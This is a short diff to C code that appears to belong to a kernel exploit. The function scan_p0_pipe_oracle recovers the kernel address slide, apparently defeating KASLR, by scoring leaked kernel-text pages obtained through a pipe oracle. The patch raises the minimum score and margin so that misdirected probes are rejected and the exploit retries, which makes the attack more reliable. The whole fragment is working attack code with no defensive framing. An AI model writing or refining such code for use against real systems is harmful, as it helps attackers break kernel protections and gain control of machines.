@@ -275,9 +275,22 @@ uintptr_t scan_p0_pipe_oracle(void) {
   pr_info("p0 fingerprint changed=%d best=%d second=%d slide=%08zx\n",
           changed_pages, best_score, second_score, best_slide);
 #endif
-  if (changed_pages != 1 || best_score < 2 || best_score <= second_score) {
+  if (changed_pages != 1 || best_score <= second_score) {
     return (uintptr_t)-1;
   }
+/* Real kernel-text captures score 7-8/8 words with a wide lead; a
+ * misdirected probe page (e.g. our own marker bytes) scores <=2 and must
+ * be rejected so the attempt retries instead of committing a bad slide. */
+#ifdef P0_FINGERPRINT_MIN_BEST
+  if (best_score < P0_FINGERPRINT_MIN_BEST ||
+      best_score - second_score < P0_FINGERPRINT_MIN_MARGIN) {
+    pr_warning("p0 fingerprint rejected low-confidence best=%d second=%d "
+               "min_best=%d margin=%d\n",
+               best_score, second_score,
+               P0_FINGERPRINT_MIN_BEST, P0_FINGERPRINT_MIN_MARGIN);
+    return (uintptr_t)-1;
+  }
+#endif
   return best_slide;
 }
 
